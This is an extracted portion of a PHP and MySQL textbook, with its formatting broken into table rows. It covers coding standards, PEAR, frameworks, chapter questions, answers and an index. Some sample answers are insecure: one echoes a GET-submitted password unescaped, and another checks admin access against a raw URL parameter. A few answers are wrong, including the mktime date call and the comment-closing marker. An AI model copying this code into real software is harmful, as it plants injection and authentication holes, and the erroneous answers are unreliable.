Larger Text,Smaller Text,Symbol
Naming,"Here are some guidelines for naming:
  
 • Name your functions to indicate what they do; for example,
  connectDatabase
 , 
  
 deleteUser
 .
  
 • Name your variables to indicate what they store; for example,
  DatabaseName
 , 
  
 RowCount
 .
  
 • Name constants using uppercase descriptive words with underscores to 
 separate words. If the constant belongs to an object, prefix the constant with 
 the name of the package.
  
 • Abbreviations are OK as long as they’re used consistently and aren’t too difficult 
  
 to interpret.
  
 • Global variables should use longer names than local variables do.
  
 PHP Coding Standards
  
 | 369",NA
Control Structures,"Control structures include
  if
 ,
  for
 ,
  while
 , and
  switch
 . You should indent four spaces for 
 the
  if
  statement. There should be one space between the statement and the opening 
 parenthesis for the expression. This helps to differentiate them visually from 
 function calls. For example:
  
 if ((expression1) || (expression2)) {
  
  
  do_something; 
  
 } 
  
 elseif ((expression3) && (expression4)) {
  
  
  do_something_else; 
  
 } 
  
 else {
  
  
  do_default; 
  
 }
  
 Curly braces (
 {}
 ) make reading your code easier and help to reduce errors. Use them 
 even if you have only one statement to execute in the block.
  
 Here’s an example for
  switch
  statements:
  
 switch (expression) {
  
  
  case 1: {
  
  
  
  do_something_1;
  
  
  
  break;
  
  
  }
  
  
  case 2: {
  
  
  
  do_something_2;
  
  
  
  break;
  
  
  }
  
  
  default: {
  
  
  
  do_default;
  
  
  
  break;
  
  
  } 
  
 }
  
 Including or requiring PHP files
  
 When you use
  include_once
  and
  require_once
 , they guarantee that the code won’t be 
 included more than once. They’re intelligent enough to keep track of which code 
 has been included between them:
  
 include_once('example.php'); 
  
 require_once('example.php');
  
 This example won’t include
  example.php
  more than once.
  
 Be sure to use
  require
  when your code can’t continue if the file to include is missing. 
 Optional code can and should use
  include
 :
  
 include('optional_functions.php');
  
 370
  
 |
  
 Chapter 18: Finishing Your Journey",NA
PEAR,"PEAR stands for PHP Extension and Application Repository. PEAR provides the 
 following:
  
 • A structured library of open source code for PHP users (
 http://opensource.org
 )
  
 • A code distribution and package maintenance system
  
 • A standard code style developed in PHP
  
 • The PHP Extension Community Library or PECL
  
 PEAR is an open source community with all the benefits that open source provides. 
 Stig S. Bakken founded it in 1999.",NA
Structured Libraries,"The code in PEAR is partitioned into packages. Each package is really just a 
 separate project with its own development team, version number, release cycle, 
 documenta-tion, and a defined relation to other packages. Every package can be 
 found on
  http:// pear.php.net/
 . Each distribution uses the PEAR installer for the 
 package to be installed on your local system.
  
 Packages may relate to each other through dependencies, but there is no automatic 
 dependency relationship between packages referenced by similar names. For 
 exam-ple, the
  DB_DataObject
  package depends on the
  DB
  package, but this isn’t 
 always the case.
  
 There is also a style guide called the
  PEAR Coding Standards
  (PCS), which helps to 
 maintain quality and consistency of all the code that’s distributed within the 
 packages.
  
 Code distribution
  
 Packages are distributed as
  gzipped
  tar files with an XML description file included. 
 The description file, usually called
  package.xml
 , contains package information, a file 
 list, and the files’ roles, including dependencies.
  
 PHP Extension Community Library (PECL)
  
 PECL (which, strangely, is pronounced like “pickle”) is a separate project that dis-
 tributes PHP extensions that are compiled code written in C. PECL extensions are 
 also distributed as packages, and they can be installed using the PEAR installer with 
 the
  pecl
  command. More information and all PECL packages are here:
  http://pecl. 
 php.net/
 .
  
 PEAR
  
 | 371",NA
Frameworks,"PHP
  frameworks
  are designed to aid rapid application development. Frameworks 
 speed up common web development tasks and offer integration between the com-
 mon elements, such as database access, templating, and session management. 
 There are many frameworks available and new ones evolving. Two popular 
 frameworks are PHP Zend and Cake.",NA
PHP Zend Framework,"The Zend Framework aims to provide a complete system for developing web 
 applica-tions designed to work with PHP 5.0. Zend is working toward providing a 
 reposi-tory of high-quality code to aid developers.
  
 The official site for the Zend Framework is
  http://framework.zend.com/
 .",NA
CakePHP,"Cake is compatible with both PHP4 and PHP5. It’s loosely based on the Ruby on 
 Rails framework for developing Ruby web applications. It encourages the use of the 
 Model View Controller (MVC) style of application development that separates data 
 access and business logic from presentation. It comes with built-in support for Ajax 
 as well.
  
 The official web site for Cake is
  http://cakephp.org/
 .
  
 372
  
 |
  
 Chapter 18: Finishing Your Journey",NA
Ajax,"Ajax
  is short for Asynchronous JavaScript and XML. Ajax is a technique for making 
 web pages more dynamic without refreshing the page. It’s actually a mix of several 
 technologies that allows a web site to request more information from a web server 
 while the user navigates a page. An example of a site that uses Ajax is Google Maps 
 (
 http://maps.google.com/
 ). As you scroll a map (type in your home address to try 
 this out), Ajax retrieves additional map data.
  
 On a technical level, the technologies involved are XHTML, CSS, and JavaScript to 
 access the Document Object Model (DOM). The
  XMLHttpRequest
  function provides 
 the ability to make subsequent requests to get more information from the web 
 server without refreshing the page. An
  IFrame
  object may also be used to request 
 the 
 data 
 asynchronously. 
 For 
 more 
 information 
 on 
 Ajax, 
 visit
  
 http://developer.mozilla.org/en/ docs/AJAX
 .",NA
Wikis,"A
  Wiki
  is a collaborative online repository of information. Anyone can contribute to 
 and modify content. Changes are arbitrated by community consensus. The most 
 famous Wiki is Wikipedia (
 http://wikipedia.org
 ) and its related MediaWiki (
 http:// 
 mediawiki.org
 ) project that powers the site and is open source. Wikis are becoming 
 a larger presence on the Web. Fortunately, MediaWiki is developed in PHP and 
 MySQL, so using and modifying it should feel natural.",NA
Finding Help on the Web,"The Web contains a plethora of information. Remember, both PHP and MySQL are 
 open source technologies, supported by a community of developers who share 
 their work. That means that code is readily available on the Web for your use. 
 There may be some code glitches, but there is help on the Web when you type your 
 query into a search engine. We prefer Google, but you can use Yahoo! or even MSN 
 to find use-ful links.
  
 First of all, you should download the PHP manual available at
  http://www.php.net/ 
 docs
 . The manual is pretty cool, since you can rapidly access any page of it if you’re 
 looking for a particular function by going to
  http://www.php.net/
 function_name 
 (you’ll fill in the italicized function name that you’re searching). There is also a 
 search utility for functions, so you don’t need to always fill in the full function name.
  
 There are numerous web sites available for your perusal. For PHP-specific informa-
 tion, the following web sites will help you:
  
 Finding Help on the Web
  
 | 373",NA
PHP User Groups ,"Check out
  http://www.phpusergroups.org/
  if you wish to locate a group in your city, 
 state, or country. There are 348 PHP user groups in 69 countries. If you’re in the 
 U.S., there are numerous groups representing most major cities. The current U.S. 
 groups are listed in Table 18-1.
  
 Table 18-1. U.S. PHP groups
  
 Group 
 location
  
  
 Group URL
  
 Atlanta, GA
  
 http://atlantaphp.org/
  
 Austin, TX
  
 http://php.meetup.com/42/
  
 Cedar Lake, IN
  
 http://www.tjtechinc.com/nipug/
  
 Chicago, IL
  
 http://chiphpug.php.net/
  
 Dallas/Fort 
 Worth, TX
  
 http://www.dallasphp.org/
  
 Denver, CO
  
 http://www.coloradophp.org/
  
 374
  
 |
  
 Chapter 18: Finishing Your Journey",NA
Chapter 18 Questions,"Question 18-1 
  
  
 Why shouldn’t you use
  <?
  and
  ?>
  to start and end your PHP code blocks?
  
 Question 18-2 
  
  
 What’s the difference between using
  //
  comments and
  /* */
  comments?
  
 Question 18-3 
  
 What’s the advantage of using the
  include_once( )
  and
  require_once( )
  direc-tives 
 instead of
  include( )
  and
  require( )
 ?
  
 Question 18-4 
  
  
 What’s wrong with this code?
  
 <? if ($_GET[user_id] == 'Admin') echo ('Welcome to the control panel.'); 
  
 else echo ('Welcome.'); ?>
  
 See the “Chapter 18” section in the Appendix for the answers to these questions.
  
 Chapter 18 Questions
  
 | 375",NA
APPENDIX,NA,NA
Solutions to Chapter Questions,1,NA
Chapter 1,"Solution to Question 1-1 
  
  
 A web server, a server-side programming language, and a 
 database.
  
 Solution to Question 1-2 
  
  
 Modules.
  
 Solution to Question 1-3 
  
  
 Structured Query Language.
  
 Solution to Question 1-4 
  
  
 They enclose HTML markup.
  
 Solution to Question 1-5 
  
  
 It processes the HTML and PHP files.",NA
Chapter 2,"Solution to Question 2-1 
  
  
 Apache, PHP, and MySQL.
  
 Solution to Question 2-2 
  
  
 Mac OS X and many Linux distributions.
  
 Solution to Question 2-3 
  
  
 The desktop.
  
 Solution to Question 2-4 
  
  
 It indicates lines that are commented out.
  
 Solution to Question 2-5 
  
  
 By not working on your local drive and transferring your files to a 
 server.
  
 Solution to Question 2-6 
  
  
 You can use an FTP program.
  
 Solution to Question 2-7 
  
  
 Through a web server.
  
 377",NA
Chapter 3,"Solution to Question 3-1 
  
  
 Everything renders as text; there is no 
 code.
  
 Solution to Question 3-2 
  
 HTML markup.
  
 Solution to Question 3-3 
  
  
 By using two slash (//) marks or /* 
 */.
  
 Solution to Question 3-4 
  
 PHP offers single-line comments, which are indicated by two slash (//) marks, 
 and multiline comments, which are indicated by an asterisk and slash. Use (/*) 
 to open a multiline comment and (*/) to close it. The third kind of comment 
 comes from HTML, opening with
  <!--
  and closing with
  -->
 .
  
 Solution to Question 3-5 
  
  
 A semicolon (;) ends all statements in PHP.
  
 Solution to Question 3-6 
  
  
 A value.
  
 Solution to Question 3-7 
  
  
 By using the following form:
  $variable_name = value;
 .
  
 Solution to Question 3-8 
  
  
 Yes.
  
 Solution to Question 3-9 
  
  
 They allow you to group code chunks together and execute them by their 
 names.
  
 Solution to Question 3-10 
  
  
 A super global.
  
 Solution to Question 3-11 
  
  
 By using the backslash (
 \
 ).
  
 Solution to Question 3-12 
  
  
 It compares two strings, including case.
  
 Solution to Question 3-13 
  
  
 Concatenation, as well as ‘.’ and ‘=’ for PHP.
  
 Solution to Question 3-14 
  
  
 A string.",NA
Chapter 4,"Solution to Question 4-1 
  
  
 Code that performs a task.
  
 Solution to Question 4-2 
  
  
 An operator.
  
 378
  
 |
  
 Appendix: Solutions to Chapter Questions",NA
Chapter 5,"Solution to Question 5-1 
  
 This isn’t a valid function. It’s missing the parentheses; furthermore, it’s bad 
 style to mix functions with your main code.
  
 Solution to Question 5-2 
  
  
 To define the toast function with a parameter:
  
 <?php 
  
 function toast( $minutes ){
  
  //do the toasting here
  
  echo (""done.""); 
  
 } 
  
 ?>
  
 Solution to Question 5-3 
  
  
 To call toast with
  5
  as the minutes 
 parameter:
  
 <?php 
  
 toast(5); 
  
 ?>
  
 Solution to Question 5-4 
  
 When you are using
  include( )
  and a file can’t be found, only a warning issues. 
 However, when you are using
  require( )
 , a missing file causes a fatal error that 
 terminates the execution of the script.
  
 Solution to Question 5-5 
  
  
 A method.",NA
Chapter 6,"Solution to Question 6-1 
  
  
 The first element is located in position
  0
  of the 
 array.
  
 Solution to Question 6-2 
  
  
 The
  $months
  array can be created as 
 follows:
  
 <?php 
  
 $months[]='January'; 
  
 $months[]='February'; 
  
 $months[]='March'; 
  
 $months[]='April'; 
  
 $months[]='May'; 
  
 $months[]='June'; 
  
 $months[]='July'; 
  
 $months[]='August'; 
  
 $months[]='September'; 
  
 $months[]='October'; 
  
 $months[]='November'; 
  
 $months[]='December'; 
  
 ?>
  
 380
  
 |
  
 Appendix: Solutions to Chapter Questions",NA
Chapter 7,"Solution to Question 7-1 
  
  
 The
  mysql
  command provides an interactive interface to MySQL.
  
 Solution to Question 7-2 
  
  
 Create the
  months
  table as follows:
  
 CREATE TABLE months (
  
  month_id INT NOT NULL 
 AUTO_INCREMENT,
  
  month VARCHAR (20),
  
  days INT,
  
  PRIMARY KEY (month_id));
  
 Chapter 7
  
 | 381",NA
Chapter 8,"Solution to Question 8-1 
  
  
 To back up a database called “blog” from the command line, execute:
  
 mysqldump -u root -p blog > my_backup.sql
  
 A password prompt appears before the backup begins.
  
 Solution to Question 8-2 
  
  
 To restore the “blog” backup file from the command line, execute:
  
 mysql -u root -p
  -D test
  < my_backup.sql
  
 A password prompt appears before the restore begins.
  
 Solution to Question 8-3 
  
  
 The advantages for creating an index are:
  
 • Queries with
  where
  clauses that match the index columns are much faster.
  
 • Verifying the uniqueness of an index value is much faster.
  
 Some disadvantages are:
  
 • Queries that insert or remove rows from an indexed table take longer for the 
  
 index to update.
  
 • Additional storage space is required to store the index.
  
 382
  
 |
  
 Appendix: Solutions to Chapter Questions",NA
Chapter 9,"Solution to Question 9-1 
  
  
 The database connection string is formatted as follows:
  
 mysql://
 db_username
 :
 db_password
 @
 db_host
 /
 db_database
 : 
  
 mysql://joe:my$ql@oreilly.com/survey
  
 Solution to Question 9-2 
  
 The database connection requires two steps when you are not using PEAR. First, 
 you must connect to the database. Once you have connected, the survey data-
 base is selected:
  
 <?php 
  
 //set the connection details 
  
 $db_host='oreilly.com'; 
  
 $db_database='survey'; 
  
 $db_username='joe'; 
  
 $db_password='my$ql'; 
  
 //call mysql_connect to connect 
  
 $connection = mysql_connect($db_host, $db_username, $db_password); 
  
 if (!$connection){ 
  
 die (""Could not connect to the database: <br />"". mysql_error( )); 
  
 } 
  
 //select the database using mysql_select_db 
  
 $db_select = mysql_select_db($db_database); 
  
 if (!$db_select){ 
  
 die (""Could not select the database: <br />"". mysql_error( )); 
  
 } 
  
 ?>
  
 Solution to Question 9-3 
  
  
 Add the following to the end of the code from Solution 9-2:
  
 <?php 
  
 $query = ""SELECT * FROM authors""; 
  
 $result = mysql_query( $query ); 
  
 if (!$result){    die (""Could not query the database: <br />"". mysql_error( )); } 
  
 while ($result_row = mysql_fetch_row(($result))){
  
  
  echo 'Author ID: '.$result_row[0] . '<br />';
  
  
  echo 'Title ID: '.$result_row[1] . '<br /> ';
  
  
  echo 'Author Name: '.$result_row[2] . '<br /><br />'; 
  
 } 
  
 //Close the connection 
  
 mysql_close($connection); 
  
 ?>
  
 Solution to Question 9-4 
  
 The PEAR functions are more compact, and they automate some of the manual 
 work of connecting to and selecting from the database. Because PEAR code is 
 used by many developers, it is less likely to have an error than to have code 
 that’s written from scratch.
  
 Chapter 9
  
 | 383",NA
Chapter 10,"Solution to Question 10-1 
  
 The super global variable
  $_SERVER['PHP_SELF']
  always returns the name of the 
 running PHP script. You can rename a script containing the global variable, and 
 your code automatically uses the new script name to process the results.
  
 Solution to Question 10-2 
  
 The code to create a username and password form that processes the values is 
 written as follows:
  
 <?php 
  
 echo ('<form action=""'.$_SERVER[""PHP_SELF""].'"" method=""GET"">'); 
  
 echo (' 
  
  
  
 <label>Username:<input type=""text"" name=""username"" size=""10"" maxlength=""30"" /> 
 </label>
  
  
  <br />
  
  
  <label>Password:<input type=""text"" name=""password"" size=""10"" maxlength=""30"" /> 
 </label>
  
  
  <input type=""submit"" value=""Submit"" />
  
  
  </form> 
  
 '); 
  
 ?>
  
 Solution to Question 10-3 
  
  
 In order to also display the username and password upon submission, 
 specify:
  
 <?php 
  
 //Get the username and password from the GET global array 
  
 $username = $_GET[""username""]; 
  
 $password = $_GET[""password""]; 
  
 //determine if this is after the form's been submitted 
  
 if (!empty($username)){
  
  //display the values from the submission
  
  echo (""Username: $username<br>"");
  
  echo (""Password: $password<br>""); 
  
 } 
  
 else { 
  
 //display the form 
  
 echo ('<form action=""'.$_SERVER[""PHP_SELF""].'"" method=""GET"">'); 
  
 echo ('
  
    
  <label>Username:<input type=""text"" name=""username"" size=""10"" 
  
 maxlength=""30"" /></label>
  
    
  <br />
  
    
  <label>Password:<input type=""text"" name=""password"" size=""10"" 
  
 maxlength=""30"" /></label>
  
    
  <input type=""submit"" value=""Submit"" />
  
    
  </form>
  
   
  '); 
  
 } 
  
 ?>
  
 Solution to Question 10-4 
  
  
 To select only author names starting with an “A,” use the following query:
  
 SELECT * FROM authors WHERE author LIKE 'A%'`
  
 384
  
 |
  
 Appendix: Solutions to Chapter Questions",NA
Chapter 11,"Solution to Question 11-1 
  
 The
  printf( )
  function prints to the output of your program, while
  sprintf( ) 
 returns its output as a string.
  
 Solution to Question 11-2 
  
  
 Check whether the date 1/31/2045 is valid as 
 follows:
  
 if (checkdate(1,31,2045)) {
  
  
  echo('Date is valid.'); 
  
 } 
  
 else {
  
  
  echo ('Invalid date.'); 
  
 }
  
 Solution to Question 11-3 
  
 To display the day of the week for 1/31/2045, you must first create a 
 timestamp for that date. The “l” in the format string for
  date( )
  indicates that the 
 full day of the week displays:
  
 <?php 
  
 $timestamp= mktime(1,31,2045); 
  
 echo date(""l"",$timestamp); 
  
 ?>
  
 Solution to Question 11-4 
  
  
 To rename the file
  upload.tmp
  to
  sample.jpg
 , 
 specify:
  
 <?php 
  
 $status=rename('upload.tmp','sample.jpg'); 
  
 if ($status) {
  
  
  echo (""Renamed file.""); 
  
 } 
  
 ?>",NA
Chapter 12,"Solution to Question 12-1 
  
  
 The elements
  <br/>
 ,
  <br />
 , and
  <br></br>
  are all acceptable XHTML format.
  
 Solution to Question 12-2 
  
 The document type is used when validating an XHTML page, while the MIME 
 type defines how your web browser interprets the content.
  
 Solution to Question 12-3 
  
 The MIME type
  application/xhtml+xml
  cannot be used exclusively because 
 Internet Explorer does not correctly interpret this MIME type.
  
 Solution to Question 12-4 
  
  
 PHP does not distinguish between XHTML and HTML output.
  
 Chapter 12
  
 | 385",NA
Chapter 13,"Solution to Question 13-1 
  
 To add the
  published_date
  column, use the connection and query code that are 
 employed throughout the chapter, but modify the query string to create the new 
 column:
  
 <?php 
  
 require_once('db_login.php'); 
  
 //sets the values for the database connection 
  
 require_once('DB.php'); 
  
 //connect to the database 
  
 $connection = DB::connect(""mysql://$db_username:$db_password@$db_host/$db_ 
  
 database""); 
  
 if (DB::isError($connection)){
  
  
  die (""Could not connect to the database: <br />"". DB:: 
  
 errorMessage($connection)); 
  
 } 
  
 //modify the table 
  
 $query = ""
 ALTER TABLE books ADD published_date date
 ""; 
  
 //check for an error 
  
 $result = $connection->query($query); 
  
 if (DB::isError($result)){
  
  
  die(""Could not query the database: <br />"". $query."" "".DB:: 
  
 errorMessage($result)); 
  
 } 
  
 echo ""Modified successfully!""; 
  
 $connection->disconnect( ); 
  
 ?>
  
 Solution to Question 13-2 
  
 SQL injection and cross-site scripting attacks. SQL Injection attacks attempt to 
 insert special characters that change the meaning of an SQL query, while Cross 
 Site Scripting attacks attempt to reveal private information from a session by 
 inserting malicious HTML.
  
 Solution to Question 13-3 
  
  
 The
  get_magic_quotes_gpc( )
  function returns
  TRUE
  if magic quotes are enabled.
  
 Solution to Question 13-4 
  
 The
  htmlentities( )
  function escapes any HTML that might otherwise be exploited.",NA
Chapter 14,"Solution to Question 14-1 
  
  
 Cookies are stored on the web user’s hard drive.
  
 Solution to Question 14-2 
  
  
 The
  md5( )
  function creates a one-way encoding of the 
 password.
  
 386
  
 |
  
 Appendix: Solutions to Chapter Questions",NA
Chapter 15,"Solution to Question 15-1 
  
 The
  .php
  extension causes the PHP interpreter to process the file instead of dis-
 playing its contents. Displaying the contents might reveal useful information for 
 breaching the security of your site, such as passwords or the inner workings of 
 your code.
  
 Solution to Question 15-2 
  
 The
  sha1( )
  function creates a 160-bit key instead of
  md5( )
 ’s 128-bit string. It 
 also uses a superior algorithm for making it difficult to determine the values 
 that generate a particular encoding.
  
 Solution to Question 15-3 
  
 If a malicious user knows that you’re storing the logged-in user’s ID in an auto-
 matic global variable, it’s easy for her to send in her own value for the user ID as 
 a URL parameter. She can then become any user.
  
 Solution to Question 15-4 
  
 Untrustworthy data, or data that a user can easily manipulate before it is 
 submit-ted to your program, includes:
  
 • Data from the
  $GET
  global array
  
 • Data from the
  $POST
  global array
  
 • Cookie data
  
 • Session data",NA
Chapter 16,"Solution to Question 16-1 
  
 JavaScript’s pros are that users get immediate feedback when entering data into 
 fields about that data’s validity, and the form doesn’t need to be redisplayed by 
 the PHP code.
  
 Chapter 16
  
 | 387",NA
Chapter 17,"Solution to Question 17-1 
  
 To change the blog name to “PHP and MySQL Zone,” modify
  config.php
  as 
 follows:
  
 <?php
  
  // put full path to Smarty.class.php
  
  require('/usr/share/php/Smarty/Smarty.class.php');
  
  $smarty = new Smarty( );
  
  $smarty->template_dir = '/home/www/htmlkb/smarty/templates';
  
  $smarty->compile_dir = '/home/www/htmlkb/smarty/templates_c';
  
  $smarty->cache_dir = '/home/www/htmlkb/smarty/cache';
  
  $smarty->config_dir = '/home/www/htmlkb/smarty/configs';
  
  $blog_title=""PHP and MySQL Zone""; 
  
 ?>
  
 Solution to Question 17-2 
  
  
 From the MySQL client, execute the SQL query:
  
 insert into categories values (NULL, 'Bugs');
  
 You can also add the row using
  phpMyAdmin
 . Because the drop-down category 
 list is created dynamically, this is the only change required to add a new 
 category.
  
 388
  
 |
  
 Appendix: Solutions to Chapter Questions",NA
Chapter 18,"Solution to Question 18-1 
  
 Some PHP interpreters may not be configured to execute PHP code that starts 
 with
  <?
 . It can also cause problems with XML parsing.
  
 Solution to Question 18-2 
  
 The
  //
  comment style comments out the current line only, while
  /*
  comments 
 out lines until a matching
  /*
  comment is encountered.
  
 Solution to Question 18-3 
  
 If you are using
  include_once( )
  and an include file is accidentally included more 
 than once, a function redefinition error will not occur. This can easily happen 
 when included files contain their own include lines.
  
 Solution to Question 18-4 
  
 The code should follow the coding conventions to make it easy to read and 
 portable:
  
 <?php 
  
 /*
  
  * this file welcomes the user.
  
  * this file welcomes the user and uses proper code styles.
  
  *
  
  * Copyright 2006 (c) O'Reilly Media, Inc.
  
  *
  
  * @version   $Id: coding_standards_example.html,v 1.2 2006/1/19 24:49:50
  
  *
  
  */ 
  
 //verify the user 
  
 if ($_GET[user_id] == 'Admin') 
  
 {
  
  //Welcome the admin user to the control panel.
  
  echo ('Welcome to the control panel.'); 
  
 } 
  
 else 
  
 {
  
  //Welcome other user.
  
  echo ('Welcome.'); 
  
 } 
  
 ?>
  
 Chapter 18
  
 | 389",NA
Index,NA,NA
Symbols,"& (ampersand) 
  
  
 && (logical AND) operator, 68, 71 
  
 bitwise AND operator, 68 
  
  
 reference operator, setting a variable 
  
  
 reference, 105 
  
  
 reference parameters, 91 
  
 < > (angle brackets) 
  
  
 < (less than) operator, 53, 68, 70 
  
  
 < > (not equal) operator, 53 
  
  
 << (bitwise shift left) operator, 68 
  
  
 <= (less than or equal to) operator, 
 54, 
  
  
 68, 70 
  
  
 > (greater than) operator, 54, 68, 70 
  
 > 
 (redirection) operator, 156 
  
  
 >= (greater than or equal to) 
  
  
  
 operator, 54, 68, 70 
  
  
 >> (bitwise shift right) operator, 68 
  
 enclosing HTML tags, 11 
  
  
 PHP tags (<?php ?>), 368 
  
 * (asterisk) 
  
  
 multiplication assignment (*=) 
  
  
  
 operator, 58 
  
  
 multiplication operator, 57, 68 
  
  
 zero or more matches in regular 
  
  
  
 expressions, 331 
  
 @ (at sign), error control operator, 68 
  
 suppressing information about the 
  
  
  
 database, 320 
  
 ~ (bitwise NOT) operator, 68
  
 \ (backslash), escaping quotes in strings, 
 52 ^ (caret) 
  
  
 beginning-of-line matching in regular 
  
  
 expressions, 331 
  
  
 bitwise NOR operator, 68 
  
  
 negating character classes in regular 
  
  
  
 expressions, 332 
  
 : (colon) 
  
  
 :: (scope resolution) operator, 104 
  
  
 separating expressions in ? operator, 74 
 , (comma) CSV data format, 158 
  
 { } (curly braces) 
  
  
 arrays referenced in string having 
  
  
  
 whitespace or punctuation in key 
  
  
 value, 111 
  
  
 enclosing statements in PHP, 73, 370 $ 
 (dollar sign) 
  
  
 beginning PHP variables, 43 
  
  
 end-of-line matching in regular 
  
  
  
 expressions, 331 
  
 = (equals sign) 
  
  
 == (equality) operator, 53, 68, 69 
  
  
 === (identity) operator, 53, 68, 70 
  
  
 assignment operator, 44, 68, 69 
  
 ! (exclamation mark) 
  
  
 != (inequality) operator, 68, 70 
  
  
 != (not equal) operator, 53 
  
  
 !== (nonidentity) operator, 68 
  
  
 logical NOT operator, 68 
  
 # (hash sign), in HTML and PHP 
  
  
  
 comments, 24
  
 We’d like to hear your suggestions for improving our indexes. Send email to
  index@oreilly.com
 .
  
 391",NA
Numbers,"1NF (First Normal Form), 150 
 2NF (Second Normal Form), 152 
 3NF (Third Normal Form), 153",NA
A,"abbreviations, 369 
  
 abstraction, 179 
  
  
 PDO database abstraction layer, 372 
 $action variable, 355 
  
 action keyword, 199 
  
 Active Server Pages (ASP), 4 
  
 ADD column command, 137 
  
 addition (+) operator, 57 
  
 addition assignment (+=) operator, 58 
 addition, date and time arithmetic, 172 
 addslashes function, 322 
  
 AFTER keyword, 137 
  
 Ajax, 373 
  
 aliases for tables included in database 
  
  
  
 query, 142 
  
 ALTER TABLE command, 136 
  
 anchors (regular expression), 331 
  
 AND (logical AND) operator, 68, 70 
 angle brackets (see < >, under Symbols) 
 answers to chapter questions, 377–389 
 Apache, 5 
  
  
 authentication, 288 
  
  
  
 access control for administrative 
  
  
  
 scripts, 308 
  
  
 installing, 16–20 
  
  
  
 default index page after 
  
  
  
  
 installation, 20 
  
  
  
 default installation directory, 18
  
 392
  
 |
  
 Index",NA
B,"\B (nonword boundary) in regular 
  
  
  
  
 expressions, 331 
  
 \b (word boundary) in regular 
  
  
  
  
 expressions, 331 
  
 <b>, <tt>, and <i> elements, no longer 
  
  
  
  
 supported in XHTML 2.0, 255 
 backing up database data, 155–159 
  
  
 best practices, 159 
  
  
 copying database files, 156 
  
  
 mysqldump command, 156–158 
  
  
  
 store database backup (example), 156 
 binary number, outputting with printf, 224 
 binary operators, 65 
  
  
 restrictions on lefthand operand, 66 
  
 bitwise NOT operator (~), 68
  
  
 Index
  
 | 393",NA
C,"CakePHP, 372 
  
 capitalize function (example), 90 
  
  
 default parameter, $each, 90 
  
  
 modifying to take a reference 
  
  
  
 parameter, 91 
  
 Cartesian product, 138 
  
 Cascading Style Sheets (see CSS) 
  
 case 
  
  
 case-insensitive searches in MySQL, 143 
  
 case-insensitivity, PHP function 
  
  
  
 names, 87 
  
  
 case-sensitivity in PHP variables, 44 
  
  
 changing for strings with PHP 
  
  
  
 functions, 231 
  
  
 in regular expression pattern 
  
  
  
 matching, 332 
  
  
 in string comparisons, 53 
  
 casting 
  
  
 converting data types, 65 
  
  
 PHP cast operators, listed, 68 
  
  
 variables, 66 
  
 categories table (blog example), 344 
  
 CGI (Common Gateway Interface), 1 
  
 chapter questions, answers to, 377–389 
 character classes (regular expression), 332 
 checkboxes (form), 204 
  
  
 using same name to store multiple 
  
  
  
 values, 208–210 
  
  
 validating user input from, 210 
  
 checkdate function, 236 
  
 class scope, 99
  
  
 displaying from selected tables in 
  
  
  
  
 MySQL, 138 
  
  
 indexes using more than one column, 
 161 
  
 referencing as TABLE.COLUMN in 
  
  
  
  
 MySQL, 140 
  
  
 removing in MySQL, 138 
  
  
 renaming in MySQL, 137 
  
  
 result row columns, 186 
  
 combined assignment operators, 58 
  
 command line, accessing MySQL, 123–125 
  
 commands available at MySQL 
  
  
  
  
 prompt, 124 
  
  
 MySQL prompts, 124 
  
 comma-separated values (CSV) format, 158 
 $comment_count variable, 350 
  
 comments 
  
  
 // for single-line and /* ... */ for multiline 
  
  
  
 comments, 42 
  
  
 HTML and PHP, 24 
  
  
 PHP, 41, 366 
  
  
  
 file comments, 367 
  
  
  
 function comments, 367 
  
 comments (blog example), adding and 
  
  
  
  
 changing, 358–364 
  
 comments table (blog example), 344 
  
 commit command, 177 
  
 Common Gateway Interface (CGI), 1 
  
 compact function, 118 
  
 comparison operators, 53 
  
  
 listed, with precedence level, operands, 
  
  
  
 and associativity, 68 
  
  
 testing the relationship between two 
  
  
  
  
 values, 70
  
 394
  
 |
  
 Index",NA
